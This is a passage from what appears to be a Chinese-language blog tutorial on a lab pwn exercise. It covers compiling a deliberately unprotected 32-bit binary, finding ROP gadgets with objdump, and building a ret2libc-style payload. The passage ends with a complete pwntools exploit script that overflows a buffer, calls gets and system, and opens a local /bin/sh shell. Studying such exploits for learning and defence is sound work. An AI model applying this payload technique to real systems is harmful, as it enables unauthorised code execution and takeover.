0;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>运行命令生成<br><code>gcc -m32 -no-pie -fno-stack-protector -z execstack -o pwn2 pwn2.c</code></p><h2 id="3、漏洞原理，利用rop结合ret2blic技术"><a href="#3、漏洞原理，利用rop结合ret2blic技术" class="headerlink" title="3、漏洞原理，利用rop结合ret2blic技术"></a>3、漏洞原理，利用rop结合ret2blic技术</h2><p>1、找到system_addr,gets_addr,sh_addr，这些都可以用<br>system_addr=elf.symbols(‘system’)<br>system_plt = elf.symbols[‘system’]<br>get_plt =  elf.symbols[‘gets’]<br>sh_addr= elf.bss()<br>2、找到gadgets，也就是利用rop<br>先得到gadgets,这里大神都用ROPGadget，不过我还不会用，我是用objdump,执行以下命令<br><code>objdump -d ./pwn2 | egrep &#39;ret|pop&#39;</code><br>结果如下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">8048309:5b                   pop    %ebx</div><div class="line">804830a:c3                   ret    </div><div class="line">8048372:5e                   pop    %esi</div><div class="line">80483a3:c3                   ret    </div><div class="line">80483d9:f3 c3                repz ret </div><div class="line">8048413:f3 c3                repz ret </div><div class="line">804843c:f3 c3                repz ret </div><div class="line">8048495:c3                   ret    </div><div class="line">80484ce:c3                   ret    </div><div class="line">80484f7:59                   pop    %ecx</div><div class="line">80484f8:5d                   pop    %ebp</div><div class="line">80484fc:c3                   ret    </div><div class="line">8048500:c3                   ret    </div><div class="line">8048568:5b                   pop    %ebx</div><div class="line">8048569:5e                   pop    %esi</div><div class="line">804856a:5f                   pop    %edi</div><div class="line">804856b:5d                   pop    %ebp</div><div class="line">804856c:c3                   ret    </div><div class="line">8048570:f3 c3                repz ret </div><div class="line">8048586:5b                   pop    %ebx</div><div class="line">8048587:c3                      ret</div></pre></td></tr></table></figure></p><p>现在我用最后一个gadgets，pop_ebx=0x8048586</p><p>构造payload:<br>payload=’a’*112+p32(get_plt)+p32(pop_ebx)+p32(sh_addr)+p32(system_plt)+p32(1)+p32(sh_addr)</p><p>p32(get_plt):函数gets的开始地址 ，后面接返回地址[p32(pop_ebx)]，再后面是要写入字符的地址[p32(sh_addr)]<br>p32(pop_ebx):这个gadgets，将栈中他后面一个8字节的数据弹出[p32(sh_addr)],然后运行返回地址[p32(system_plt)]<br>p32(sh_addr):这是bss的地址（可读可写可执行），为了将’\bin\sh’写入这里,也是函数gets[p32(get_plt)]的参数<br>p32(system_plt):这是p32(pop_ebx)函数的返回地址，这里改为我们要执行的system的地址<br>p32(1):system的返回地址，因为用不到，这里我随便填的。<br>p32(sh_addr):system的第一个参数，要执行字符串的地址，我们要拿到shell,就填’/bin/sh’的地址</p><h2 id="4、exp"><a href="#4、exp" class="headerlink" title="4、exp"></a>4、exp</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line">p = process(<span class="string">'./pwn2'</span>)</div><div class="line">elf = ELF(<span class="string">'pwn2'</span>)</div><div class="line">system_plt = elf.symbols[<span class="string">'system'</span>]</div><div class="line">get_plt =  elf.symbols[<span class="string">'gets'</span>]</div><div class="line">sh_addr= elf.bss()</div><div class="line">pop_ebx= 0x8048586</div><div class="line"><span class="comment">#gdb.attach(p)</span></div><div class="line">payload=<span class="string">'a'</span>*112+p32(get_plt)+p32(pop_ebx)+p32(sh_addr)+p32(system_plt)+p32(1)+p32(sh_addr)</div><div class="line">p.sendline(payload)</div><div class="line">p.sendline(<span class="string">'/bin/sh'</span>)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;啥是rop?&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
</feed>
